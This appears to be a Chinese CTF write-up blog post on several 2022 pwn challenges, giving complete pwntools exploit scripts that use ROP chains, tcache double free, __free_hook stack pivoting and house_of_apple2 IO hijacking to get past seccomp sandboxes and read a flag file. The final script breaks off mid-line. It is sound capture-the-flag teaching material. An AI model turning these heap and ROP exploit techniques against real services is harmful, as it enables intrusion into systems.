<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&gt;&#x27; : 1</span></span><br><span class="line"><span class="string">&#x27;&lt;&#x27; : 2</span></span><br><span class="line"><span class="string">&#x27;+&#x27; : 3</span></span><br><span class="line"><span class="string">&#x27;-&#x27; : 4</span></span><br><span class="line"><span class="string">&#x27;.&#x27; : 5</span></span><br><span class="line"><span class="string">&#x27;,&#x27; : 6</span></span><br><span class="line"><span class="string">&#x27;[&#x27; : 7</span></span><br><span class="line"><span class="string">&#x27;]&#x27; : 8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;BF_PARSER&gt;&gt;\n&#x27;</span>)</span><br><span class="line">pld = <span class="string">b&#x27;&gt;&#x27;</span> * <span class="number">0x238</span> + <span class="string">b&#x27;.&#x27;</span></span><br><span class="line">pld += (<span class="string">b&#x27;&gt;&#x27;</span> + <span class="string">b&#x27;.&#x27;</span>) * <span class="number">5</span></span><br><span class="line">pld += <span class="string">b&#x27;&lt;&#x27;</span> * <span class="number">0x25</span></span><br><span class="line">pld += (<span class="string">b&#x27;,&#x27;</span> + <span class="string">b&#x27;&gt;&#x27;</span>) * <span class="number">8</span> * <span class="number">37</span></span><br><span class="line">s(pld)</span><br><span class="line"></span><br><span class="line">libc_base = uu64() - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">243</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">p_rdi_r = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">p_rsi_r = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">p_rdx_r = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line">p_rax_r = libc_base + <span class="number">0x0000000000036174</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x00000000000630a9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0, flag_addr, 10)</span></span><br><span class="line">pld = p64(p_rdi_r) + p64(<span class="number">0</span>)</span><br><span class="line">pld += p64(p_rsi_r) + p64(libc_base + <span class="number">0x1ee000</span>)</span><br><span class="line">pld += p64(p_rdx_r) + p64(<span class="number">10</span>)</span><br><span class="line">pld += p64(p_rax_r) + p64(<span class="number">0</span>) + p64(syscall_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># close(0)</span></span><br><span class="line">pld += p64(p_rdi_r) + p64(<span class="number">0</span>)</span><br><span class="line">pld += p64(p_rax_r) + p64(<span class="number">3</span>) + p64(syscall_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># open(flag_addr)</span></span><br><span class="line">pld += p64(p_rdi_r) + p64(libc_base + <span class="number">0x1ee000</span>)</span><br><span class="line">pld += p64(p_rax_r) + p64(<span class="number">2</span>) + p64(syscall_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0, flag_addr, 16)</span></span><br><span class="line">pld += p64(p_rdi_r) + p64(<span class="number">0</span>)</span><br><span class="line">pld += p64(p_rsi_r) + p64(libc_base + <span class="number">0x1ee100</span>)</span><br><span class="line">pld += p64(p_rdx_r) + p64(<span class="number">16</span>)</span><br><span class="line">pld += p64(p_rax_r) + p64(<span class="number">0</span>) + p64(syscall_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write(1, flag_addr, 16)</span></span><br><span class="line">pld += p64(p_rdi_r) + p64(<span class="number">1</span>)</span><br><span class="line">pld += p64(p_rsi_r) + p64(libc_base + <span class="number">0x1ee100</span>)</span><br><span class="line">pld += p64(p_rdx_r) + p64(<span class="number">16</span>)</span><br><span class="line">pld += p64(p_rax_r) + p64(<span class="number">1</span>) + p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">s(pld)</span><br><span class="line">s(<span class="string">&#x27;flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="only"><a href="#only" class="headerlink" title="only"></a>only</h3><p>由于程序是通过seccomp函数实现沙盒，所以会导致堆残留：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heapinfo</span></span><br><span class="line">(0x20)     fastbin[0]: 0x55a50773c7d0 --&gt; 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x55a50773cfa0 (size : 0x20060) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x20)   tcache_entry[0](7): 0x55a50773c8f0 --&gt; 0x55a50773ca00 --&gt; 0x55a50773ccb0 --&gt; 0x55a50773ce30 --&gt; 0x55a50773cc90 --&gt; 0x55a50773cf40 --&gt; 0x55a50773cb10</span><br><span class="line">(0x50)   tcache_entry[3](1): 0x55a50773cf60</span><br><span class="line">(0x70)   tcache_entry[5](7): 0x55a50773c800 --&gt; 0x55a50773cba0 --&gt; 0x55a50773c910 --&gt; 0x55a50773cb30 --&gt; 0x55a50773ccd0 --&gt; 0x55a50773ce50 --&gt; 0x55a50773ca20</span><br><span class="line">(0x80)   tcache_entry[6](5): 0x55a50773c870 --&gt; 0x55a50773c980 --&gt; 0x55a50773cc10 --&gt; 0x55a50773cec0 --&gt; 0x55a50773ca90</span><br><span class="line">(0xd0)   tcache_entry[11](1): 0x55a50773c350</span><br><span class="line">(0xf0)   tcache_entry[13](2): 0x55a50773cd40 --&gt; 0x55a50773c6b0</span><br></pre></td></tr></table></figure>

<p>注意以下几个问题：</p>
<ul>
<li>需要知道tcache检查二次释放的key放置在堆块的bk位置，所以题目给我们的礼物就是将堆块的fd和bk置零，实现<code>double free</code>。</li>
<li>要注意堆分水的布置，因为只有11次，不够我们挥霍，而且最后修改完<code>__free_hook</code>正好是11次。</li>
<li>最后，也是没想到的，得益于<code>mov rsp, rdx ; ret</code>这一个汇编，使得我们可以在<code>__free_hook</code>附近进行ROP。</li>
</ul>
<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./only&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./only&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">once</span>():</span><br><span class="line">    sla(<span class="string">&#x27;Choice &gt;&gt; &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Choice &gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&#x27;Content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    sla(<span class="string">&#x27;Choice &gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xe0</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">once()</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xe0</span>, <span class="string">b&#x27;\xf0\xb7&#x27;</span>)</span><br><span class="line">add(<span class="number">0xe0</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">add(<span class="number">0xe0</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x491</span>) + <span class="string">b&#x27;\x40\xb8&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&#x27;\xa0\x36&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, p64(<span class="number">0</span>) * <span class="number">6</span> + <span class="string">b&#x27;\x30\x4e&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, p64(<span class="number">0xfbad1887</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = uu64() - <span class="number">0x1ec980</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">magic = libc_base + <span class="number">0x0000000000151990</span>      <span class="comment"># mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span></span><br><span class="line">lg(<span class="string">&#x27;magic&#x27;</span>)</span><br><span class="line">m_rsp_rdx_r = libc_base + <span class="number">0x000000000005b4d0</span>    <span class="comment"># mov rsp, rdx ; ret</span></span><br><span class="line">lg(<span class="string">&#x27;m_rsp_rdx_r&#x27;</span>)</span><br><span class="line">p_rdi_r = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">p_rsi_r = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">p_rdx_r = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line">p_4_r = libc_base + <span class="number">0x0000000000023b63</span>      <span class="comment"># pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line">op = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">rd = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pt = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gt = libc_base + libc.sym[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pld = p64(p_4_r) + p64(free_hook - <span class="number">0x18</span>) </span><br><span class="line">pld += <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span></span><br><span class="line">pld += p64(magic) + p64(m_rsp_rdx_r)</span><br><span class="line">pld += p64(p_rdi_r) + p64(free_hook + <span class="number">0x28</span>)</span><br><span class="line">pld += p64(gt)</span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *&#x27; + hex(m_rsp_rdx_r))</span></span><br><span class="line">add(<span class="number">0x70</span>, pld)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">pld = p64(p_rdi_r) + p64(free_hook + <span class="number">0x20</span>)</span><br><span class="line">pld += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">pld += p64(p_rdx_r) + p64(<span class="number">0</span>)</span><br><span class="line">pld += p64(op)</span><br><span class="line">pld += p64(p_rdi_r) + p64(<span class="number">3</span>)</span><br><span class="line">pld += p64(p_rsi_r) + p64(free_hook + <span class="number">0x100</span>)</span><br><span class="line">pld += p64(p_rdx_r) + p64(<span class="number">16</span>)</span><br><span class="line">pld += p64(rd)</span><br><span class="line">pld += p64(p_rdi_r) + p64(free_hook + <span class="number">0x100</span>)</span><br><span class="line">pld += p64(pt)</span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *&#x27; + hex(p_rdi_r))</span></span><br><span class="line">sl(pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>这是关闭了地址随机化的脚本，正常是需要爆破的。</p>
<h3 id="store"><a href="#store" class="headerlink" title="store"></a>store</h3><blockquote>
<p>参考文章：<a href="https://blog.csdn.net/weixin_51480590/article/details/127917289?spm=1001.2014.3001.5501">2022强网拟态pwn wp_l1s00t的博客-CSDN博客</a></p>
</blockquote>
<p>查看一下沙盒：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pursue@pursue-virtual-machine:~/桌面/competition/2022强网拟态/pwn/store$ seccomp-tools dump ./store </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x0e 0xc000003e  if (A != ARCH_X86_64) goto 0016</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x13 0xffffffff  if (A != 0xffffffff) goto 0024</span><br><span class="line"> 0005: 0x15 0x11 0x00 0x0000000c  if (A == brk) goto 0023</span><br><span class="line"> 0006: 0x15 0x10 0x00 0x00000000  if (A == read) goto 0023</span><br><span class="line"> 0007: 0x15 0x0f 0x00 0x00000001  if (A == write) goto 0023</span><br><span class="line"> 0008: 0x15 0x0e 0x00 0x00000005  if (A == fstat) goto 0023</span><br><span class="line"> 0009: 0x15 0x0d 0x00 0x0000000a  if (A == mprotect) goto 0023</span><br><span class="line"> 0010: 0x15 0x0c 0x00 0x0000003c  if (A == exit) goto 0023</span><br><span class="line"> 0011: 0x15 0x0b 0x00 0x0000005a  if (A == chmod) goto 0023</span><br><span class="line"> 0012: 0x15 0x0a 0x00 0x0000008c  if (A == getpriority) goto 0023</span><br><span class="line"> 0013: 0x15 0x09 0x00 0x0000008d  if (A == setpriority) goto 0023</span><br><span class="line"> 0014: 0x15 0x08 0x00 0x000000c0  if (A == lgetxattr) goto 0023</span><br><span class="line"> 0015: 0x15 0x07 0x08 0x000000e6  if (A == clock_nanosleep) goto 0023 else goto 0024</span><br><span class="line"> </span><br><span class="line"> 0016: 0x15 0x00 0x07 0x40000003  if (A != ARCH_I386) goto 0024</span><br><span class="line"> 0017: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0018: 0x15 0x04 0x00 0x00000005  if (A == fstat) goto 0023					// 5 : open</span><br><span class="line"> 0019: 0x15 0x03 0x00 0x0000005a  if (A == chmod) goto 0023					// 90 : mmap</span><br><span class="line"> 0020: 0x15 0x02 0x00 0x0000008c  if (A == getpriority) goto 0023</span><br><span class="line"> 0021: 0x15 0x01 0x00 0x0000008d  if (A == setpriority) goto 0023			// 141 : getdents</span><br><span class="line"> 0022: 0x15 0x00 0x01 0x000000c0  if (A != lgetxattr) goto 0024			    // 192 : mmap2</span><br><span class="line"> 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0024: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<p>很奇怪的一个沙盒，发现还检查了i386的系统调用号。不过<code>seccomp-tools</code>没能够正确显示32位的系统调用号，也就是说一律按照64位的系统调用号显示，所以需要将其中32位的进行转换，可以参考：<a href="https://blog.csdn.net/Nashi_Ko/article/details/120288385">(9条消息) Linux X86架构 32 64系统调用表_Nashi_Ko的博客-CSDN博客_x86 linux 函数调用表</a>这篇文章进行查找，本人已在上面做出了注释。除此以外，要注意x86汇编中寄存器传参的规则，顺序是<code>ebx</code>、<code>ecx</code>、<code>edx</code>、<code>esi</code>、<code>edi</code>和<code>ebp</code>。关于这里使用<code>mmap2()</code>成功，而<code>mmap()</code>使用失败的原因，查看：<a href="https://www.yiibai.com/unix_system_calls/mmap2.html">mmap2()函数 Unix&#x2F;Linux - Unix&#x2F;Linux系统调用 (yiibai.com)</a></p>
<p>这道题由于分配堆块的次数有限，而且需要泄露地址，所以只能打IO，用的是<code>house_of_apple2</code>劫持程序控制流。注意，在这之后还需要<code>mmap()</code>函数开辟一块小地址空间给32位汇编使用，因为在给open传入字符串时，64位的地址传入是会失败的。</p>
<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld-2.31.so&quot;</span>, <span class="string">b&quot;./store&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc-2.31.so&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./store&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./store&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content, remark</span>):     <span class="comment"># twice</span></span><br><span class="line">    sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))    <span class="comment"># size &lt;= 0xfff</span></span><br><span class="line">    sa(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line">    sa(<span class="string">&#x27;Remark: &#x27;</span>, remark)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):        <span class="comment"># forth</span></span><br><span class="line">    sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))    <span class="comment"># uaf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content, remark</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line">    sa(<span class="string">&#x27;Remark: &#x27;</span>, remark)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):    </span><br><span class="line">    sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gift</span>(<span class="params">size</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))    </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>, <span class="string">b&#x27;pursue&#x27;</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x510</span>, <span class="string">b&#x27;pursue&#x27;</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = uu64() - <span class="number">0x1ebbe0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">IO_list_all = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">IO_wfile_jumps = libc_base + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">setcontext_61 = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">lg(<span class="string">&#x27;setcontext_61&#x27;</span>)</span><br><span class="line">mprotect = libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">p_rdi_r = libc_base + <span class="number">0x0000000000026b72</span></span><br><span class="line">p_rsi_r = libc_base + <span class="number">0x0000000000027529</span></span><br><span class="line">p_rdx_r12_r = libc_base + <span class="number">0x000000000011c1e1</span></span><br><span class="line">p_rax_r = libc_base + <span class="number">0x000000000004a550</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x0000000000066229</span></span><br><span class="line"></span><br><span class="line">gift(<span class="number">0x600</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">15</span> + <span class="string">b&#x27;b&#x27;</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&#x27;ab&#x27;</span>)</span><br><span class="line">heap_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0xcb0</span></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(libc_base + <span class="number">0x1ec010</span>) * <span class="number">2</span> + p64(heap_base + <span class="number">0xcb0</span>) + p64(IO_list_all - <span class="number">0x20</span>), <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">gift(<span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># _flags = prev_size = 0</span></span><br><span class="line"><span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file1 = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span 